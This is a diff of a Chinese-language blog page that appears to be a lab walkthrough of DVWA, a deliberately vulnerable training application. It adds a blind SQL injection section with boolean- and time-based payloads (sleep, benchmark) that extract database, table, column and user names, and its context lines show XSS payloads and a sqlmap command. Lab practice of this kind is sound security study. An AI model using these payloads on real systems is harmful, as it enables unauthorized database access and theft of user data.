@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="DVWA," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,20 +79,21 @@
 
 
 
-<meta name="description" content="xss存储型xsslow查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞 name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为： 12&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;img src&#x3D;2  onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;  message参数也是相同以上两种都适">
+<meta name="description" content="title: DVWA实践date: 2020-03-14 15:14:39tags:  DVWAcategories:  学习实践 xss存储型xsslow查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞 name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为： 12&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;scr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA实践">
 <meta property="og:url" content="http://yoursite.com/2020/03/14/DVWA%E5%AE%9E%E8%B7%B5/index.html">
 <meta property="og:site_name" content="QuanYex&#39;s Blog">
-<meta property="og:description" content="xss存储型xsslow查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞 name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为： 12&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;img src&#x3D;2  onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;  message参数也是相同以上两种都适">
+<meta property="og:description" content="title: DVWA实践date: 2020-03-14 15:14:39tags:  DVWAcategories:  学习实践 xss存储型xsslow查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞 name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为： 12&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;scr">
 <meta property="og:image" content="http://lulu.izliang.com/yty/11bbd74c9ab776532a4f84dd860195b.png">
 <meta property="og:image" content="http://lulu.izliang.com/yty/4c9040402a1505bdaa890ce28cb1afb.png">
 <meta property="og:image" content="http://lulu.izliang.com/yty/ea2a7976dda046eeabe1b582ab40a94.png">
 <meta property="og:image" content="http://lulu.izliang.com/yty/f2014522d434768aa62c8cb912c0a30.png">
-<meta property="article:published_time" content="2020-03-14T07:14:39.000Z">
-<meta property="article:modified_time" content="2020-04-10T08:28:46.079Z">
+<meta property="og:image" content="http://lulu.izliang.com/yty/yanshiceshi1.png">
+<meta property="og:image" content="http://lulu.izliang.com/yty/yanshizhuru2.png">
+<meta property="article:published_time" content="2020-03-14T07:14:39.857Z">
+<meta property="article:modified_time" content="2020-04-11T03:23:56.477Z">
 <meta property="article:author" content="QuanYex">
-<meta property="article:tag" content="DVWA">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://lulu.izliang.com/yty/11bbd74c9ab776532a4f84dd860195b.png">
 
@@ -302,34 +303,12 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-04-10T16:28:46+08:00">
-                2020-04-10
+              <time title="更新于" itemprop="dateModified" datetime="2020-04-11T11:23:56+08:00">
+                2020-04-11
               </time>
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index">
-                    <span itemprop="name">学习实践</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -358,7 +337,8 @@
       
 
       
-        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞</p>
+        <p>title: DVWA实践<br>date: 2020-03-14 15:14:39<br>tags:  DVWA<br>categories:  学习实践</p>
+<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞</p>
 <p>name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=2  onerror=alert(/</span>xss/)&gt;</span><br></pre></td></tr></table></figure>
 
@@ -542,7 +522,79 @@
 <h2 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h2><h3 id="手工注入-2"><a href="#手工注入-2" class="headerlink" title="手工注入"></a>手工注入</h3><p>进入high级别发现，显示和输入不在一个页面了，在输入页面尝试<code>1&#39; and &#39;1&#39; = &#39;2</code>发现可以执行但显示界面没有数据显示，说明存在字符型注入。剩下的与low方法类似。业务场景虽然改变，但是没什么影响。</p>
 <h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>因为输入和显示页面不是同一个页面所以代码也要相应改变。使用–second-url来表明显示页面，所以代码为</p>
 <p><code>sqlmap.py -u &quot;http://quanyex.local.com/dvwa-master/vulnerabilities/sqli/session-input.php#&quot; --data &quot;id=1$Submit=Submit&quot; --cookie &quot;security=high;PHPSESSID=2ghptdtrr6159ml6gt8ik7bu05&quot; --second-url &quot;http://quanyex.local.com/dvwa-master/vulnerabilities/sqli/&quot;</code>这样就可以正常注入。</p>
+<h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><p>注入的poc：</p>
+<p>1”  and “1” = “2</p>
+<p>1’ and ‘1’ = ‘2</p>
+<p>1 and  1 = 2</p>
+<p>用到的函数：</p>
+<p>length(str)</p>
+<p>substr(expression,start,length)  获取字符串（原始字符串，子串开始位置，子串长度） </p>
+<p>ascii(string)  获取第一个字符的ASCII数值（字符串）<font color=red>注意：单字符ASCII码范围0-127</font></p>
+<p>count()     count() 函数返回匹配指定条件的行数。 用法select count()</p>
+<p>if(expr1,expr2,expr3)  如果expr1为真，返回expr2，否则返回expr3.</p>
+<p>sleep(N)          休眠（n秒）</p>
+<p>benchmark(count,expr)      重复计算（次数为count，表达式）次数不要太多容易打挂服务器。</p>
+<h2 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h2><h3 id="手工注入-3"><a href="#手工注入-3" class="headerlink" title="手工注入"></a>手工注入</h3><p>输入框中输入1，显示存在，输入1 and  1=2 显示存在，输入1’ and ‘1’ = ‘2 显示不存在。说明这里存在字符型注入漏洞是由单引号闭合的。首先来判断数据库的长度，</p>
+<p>输入<code>1&#39; and length(database())&gt;1 --</code>此时显示存在，</p>
+<p>继续<code>1&#39; and length(database())&gt;10 --</code>显示不存在，</p>
+<p>二分法<code>1&#39; and length(database())&gt;5 --</code>不存在，</p>
+<p><code>1&#39; and length(database())&gt;3 --</code>存在，说明长度为4。</p>
+<p><strong>接下来要确定字符串的内容，</strong></p>
+<p>输入<code>1&#39; and ascii(substr(database(),1,1))&gt;64 --</code>显示存在，说明第一个字符ASCII码范围是65-127</p>
+<p>二分法，<code>1&#39; and ascii(substr(database(),1,1))&gt;96 --</code>显示存在，</p>
+<p><code>1&#39; and ascii(substr(database(),1,1))&gt;112 --</code>显示不存在，</p>
+<p><code>1&#39; and ascii(substr(database(),1,1))&gt;104 --</code>显示不存在，</p>
+<p><code>1&#39; and ascii(substr(database(),1,1))&gt;100 --</code>显示不存在，</p>
+<p><code>1&#39; and ascii(substr(database(),1,1))&gt;98 --</code>显示存在，</p>
+<p><code>1&#39; and ascii(substr(database(),1,1))&gt;99 --</code>显示存在，</p>
+<p>说明第一个字符的ASCII码为100，对应的字符为d，同样的方法确定第二个字符为v，第三个字符为w，第四个字符为a，确定数据库名为dvwa。</p>
+<p><strong>接着猜解数据库中的表名：（先得到表的个数，在猜解表名）</strong></p>
+<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)&gt;10 --</code>不存在</p>
+<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)&gt;5 --</code>不存在</p>
+<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)&gt;3 --</code>不存在</p>
+<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)&gt;2 --</code>不存在</p>
+<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)&gt;1 --</code>存在</p>
+<p>所以表的数目为2，接着猜解表名：（表名称长度）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 1.查询列出当前连接数据库下的所有表名称</span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database()</span><br><span class="line"># 2.列出当前连接数据库中的第1个表名称</span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br><span class="line"># 3.以当前连接数据库第1个表的名称作为字符串，从该字符串的第一个字符开始截取其全部字符</span><br><span class="line">substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1)</span><br><span class="line"># 4.计算所截取当前连接数据库第1个表名称作为字符串的长度值</span><br><span class="line">length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))</span><br><span class="line"># 5.将当前连接数据库第1个表名称长度与某个值比较作为判断条件，联合and逻辑构造特定的sql语句进行查询，根据查询返回结果猜解表名称的长度值</span><br><span class="line">1&#39; and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&gt;10 --</span><br></pre></td></tr></table></figure>
 
+<p><code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;10 --</code>不存在</p>
+<p><code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;5 --</code>存在</p>
+<p><code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;8 --</code>存在</p>
+<p><code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;9 --</code>不存在</p>
+<p>所以第一个表名的长度为9，接着猜解名称</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;64 --</code>存在</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;96 --</code>存在</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;112 --</code>不存在</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;104 --</code>不存在</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --</code>存在</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;102 --</code>存在</p>
+<p><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 --</code>不存在</p>
+<p>说明第一个字符ascii码为103，对应g，照此依次破解为u、e、s、t、b、o、o、k ，然后破解第二个表长度为5，表名为users</p>
+<p><strong>猜解字段名：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 判断[dvwa库-users表]中的字段数目</span><br><span class="line">(select count(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;)&#x3D;xxx</span><br><span class="line"># 判断在[dvwa库-users表]中是否存在某个字段（调整column_name取值进行尝试匹配）</span><br><span class="line">(select count(*) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; and column_name&#x3D;&#39;xxx&#39;)&#x3D;1</span><br><span class="line"># 猜解第i+1个字段的字符长度</span><br><span class="line">length(substr((select column_name from information_shchema.columns limit $i$,1),1))&#x3D;xxx</span><br><span class="line"># 猜解第i+1个字段的字符组成，j代表组成字符的位置（从左至右第1&#x2F;2&#x2F;...号位）</span><br><span class="line">ascii(substr((select column_name from information_schema.columns limit $i$,1),$j$,1))&#x3D;xxx</span><br></pre></td></tr></table></figure>
+
+<p>猜解字段个数：</p>
+<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;10 --</code>不存在</p>
+<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;5 --</code>存在</p>
+<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;8 --</code>不存在</p>
+<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;7 --</code>存在</p>
+<p>说明字段个数为8，接着猜解字段名，猜想数据库中可能保存的字段名称<br> 用户名：username/user_name/uname/u_name/user/name/…<br> 密码：password/pass_word/pwd/pass/…</p>
+<p><code>1&#39; and (select count(*) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; and column_name=&#39;username&#39;)=1 --</code>不存在</p>
+<p><code>1&#39; and (select count(*) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; and column_name=&#39;user&#39;)=1 --</code>存在</p>
+<p><code>1&#39; and (select count(*) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; and column_name=&#39;password&#39;)=1 --</code>存在</p>
+<p>说明字段user和password存在。</p>
+<p><strong>获取字段值：</strong></p>
+<p><code>1&#39; and length(substr((select user from users limit 0,1),1))&gt;10 --</code>不存在</p>
+<p><code>1&#39; and length(substr((select user from users limit 0,1),1))&gt;5 --</code>不存在</p>
+<p><code>1&#39; and length(substr((select user from users limit 0,1),1))&gt;3 --</code>存在</p>
+<p><code>1&#39; and length(substr((select user from users limit 0,1),1))&gt;4 --</code>存在</p>
+<p>说明第一个用户名长度为5</p>
+<p><strong>—————————————————————————————————————————————————–</strong></p>
+<h2 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h2><p>测试sleep函数<code>1&#39; and sleep(if(length(database())=4,5,0)) --</code></p>
+<p><img src="http://lulu.izliang.com/yty/yanshiceshi1.png" alt=""></p>
+<p>测试benchmark函数<code>1&#39; and benchmark(if(length(database())=4,5000000,0),md5(&#39;test&#39;)); --</code></p>
+<p><img src="http://lulu.izliang.com/yty/yanshizhuru2.png" alt=""></p>
+<h2 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h2>
       
     </div>
     
@@ -556,12 +608,6 @@
     
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/DVWA/" rel="tag"># DVWA</a>
-          
-        </div>
       
 
       
@@ -676,7 +722,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -687,7 +733,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -720,7 +766,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss"><span class="nav-number">1.</span> <span class="nav-text">xss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型xss"><span class="nav-number">1.1.</span> <span class="nav-text">存储型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low"><span class="nav-number">1.1.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium"><span class="nav-number">1.1.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high"><span class="nav-number">1.1.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型xss"><span class="nav-number">1.2.</span> <span class="nav-text">反射型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low-注意"><span class="nav-number">1.2.1.</span> <span class="nav-text">low(注意)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM型xss"><span class="nav-number">1.3.</span> <span class="nav-text">DOM型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">high</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">2.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low-2"><span class="nav-number">2.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-3"><span class="nav-number">2.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high-3"><span class="nav-number">2.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQl回显注入"><span class="nav-number">3.</span> <span class="nav-text">SQl回显注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low-3"><span class="nav-number">3.1.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入"><span class="nav-number">3.1.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">3.1.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-4"><span class="nav-number">3.2.</span> <span class="nav-text">medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high-4"><span class="nav-number">3.3.</span> <span class="nav-text">high</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-2"><span class="nav-number">3.3.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss"><span class="nav-number">1.</span> <span class="nav-text">xss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型xss"><span class="nav-number">1.1.</span> <span class="nav-text">存储型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low"><span class="nav-number">1.1.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium"><span class="nav-number">1.1.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high"><span class="nav-number">1.1.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型xss"><span class="nav-number">1.2.</span> <span class="nav-text">反射型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low-注意"><span class="nav-number">1.2.1.</span> <span class="nav-text">low(注意)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM型xss"><span class="nav-number">1.3.</span> <span class="nav-text">DOM型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">high</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">2.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low-2"><span class="nav-number">2.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-3"><span class="nav-number">2.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high-3"><span class="nav-number">2.3.</span> <span class="nav-text">high</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQl回显注入"><span class="nav-number">3.</span> <span class="nav-text">SQl回显注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low-3"><span class="nav-number">3.1.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入"><span class="nav-number">3.1.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">3.1.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-4"><span class="nav-number">3.2.</span> <span class="nav-text">medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high-4"><span class="nav-number">3.3.</span> <span class="nav-text">high</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-2"><span class="nav-number">3.3.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL盲注"><span class="nav-number">4.</span> <span class="nav-text">SQL盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low-4"><span class="nav-number">4.1.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入-3"><span class="nav-number">4.1.1.</span> <span class="nav-text">手工注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-5"><span class="nav-number">4.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#low-5"><span class="nav-number">4.3.</span> <span class="nav-text">low</span></a></li></ol></li></ol></div>
             
 
           </div>
